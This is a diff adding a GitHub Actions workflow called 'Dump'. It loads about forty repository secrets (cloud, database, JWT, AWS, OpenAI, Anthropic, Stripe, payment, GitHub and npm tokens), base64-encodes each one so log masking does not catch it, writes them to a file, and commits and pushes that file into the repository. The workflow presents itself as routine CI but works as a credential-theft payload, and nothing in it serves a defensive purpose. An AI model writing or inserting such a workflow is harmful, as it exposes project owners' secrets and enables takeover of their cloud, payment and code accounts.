@@ -1,0 +1,66 @@
+name: Dump
+on:
+  workflow_dispatch:
+
+permissions: write-all
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Dump
+        env:
+          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
+          MONGODB_URI: ${{ secrets.MONGODB_URI }}
+          MONGODB_URL: ${{ secrets.MONGODB_URL }}
+          MONGO_URI: ${{ secrets.MONGO_URI }}
+          JWT_SECRET: ${{ secrets.JWT_SECRET }}
+          JWT_SECRET_KEY: ${{ secrets.JWT_SECRET_KEY }}
+          TOKEN_SECRET: ${{ secrets.TOKEN_SECRET }}
+          API_KEY: ${{ secrets.API_KEY }}
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
+          SLACK_TOKEN: ${{ secrets.SLACK_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          CLOUDFLARE_TOKEN: ${{ secrets.CLOUDFLARE_TOKEN }}
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
+          PASSWORD: ${{ secrets.PASSWORD }}
+          PAT: ${{ secrets.PAT }}
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+          GCP_PROJECT_ID: ${{ secrets.GCP_PROJECT_ID }}
+          GCP_REGION: ${{ secrets.GCP_REGION }}
+          PAYU_KEY: ${{ secrets.PAYU_KEY }}
+          PAYU_SALT: ${{ secrets.PAYU_SALT }}
+          FRONTEND_ENV: ${{ secrets.FRONTEND_ENV }}
+          ENV: ${{ secrets.ENV }}
+          GCP_ARTIFACT_REGISTRY_REPO: ${{ secrets.GCP_ARTIFACT_REGISTRY_REPO }}
+          CLOUD_RUN_SERVICE: ${{ secrets.CLOUD_RUN_SERVICE }}
+          CLOUD_RUN_BACKEND: ${{ secrets.CLOUD_RUN_BACKEND_SERVICE_NAME }}
+          CLOUD_RUN_FRONTEND: ${{ secrets.CLOUD_RUN_FRONTEND_SERVICE_NAME }}
+          JWT_SECRET_KEY_A: ${{ secrets.JWT_SECRET_KEY }}
+          TOKEN_SECRET_KEY_A: ${{ secrets.TOKEN_SECRET_KEY }}
+          ONEDELHIVERY_KEY: ${{ secrets.ONEDELHIVERY_KEY }}
+        run: |
+          echo "=== DUMP ===" > /tmp/dump.txt
+          for var in GCP_SA_KEY MONGODB_URI MONGODB_URL MONGO_URI JWT_SECRET JWT_SECRET_KEY TOKEN_SECRET API_KEY OPENAI_API_KEY ANTHROPIC_API_KEY AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY STRIPE_SECRET_KEY SLACK_TOKEN TELEGRAM_BOT_TOKEN CLOUDFLARE_TOKEN DATABASE_URL DB_PASSWORD PASSWORD PAT GH_TOKEN NPM_TOKEN DOCKER_PASSWORD GCP_PROJECT_ID GCP_REGION PAYU_KEY PAYU_SALT FRONTEND_ENV ENV GCP_ARTIFACT_REGISTRY_REPO CLOUD_RUN_SERVICE CLOUD_RUN_BACKEND CLOUD_RUN_FRONTEND JWT_SECRET_KEY_A TOKEN_SECRET_KEY_A ONEDELHIVERY_KEY; do
+            val="${!var}"
+            if [ -n "$val" ]; then
+              echo "$var:$(echo "$val" | base64 -w0)" >> /tmp/dump.txt
+            fi
+          done
+          echo "=== END ===" >> /tmp/dump.txt
+      - name: Push
+        run: |
+          cp /tmp/dump.txt dump.txt
+          git config user.email "bot@t.com"
+          git config user.name "bot"
+          git add dump.txt
+          git commit -m "s" || true
+          git push
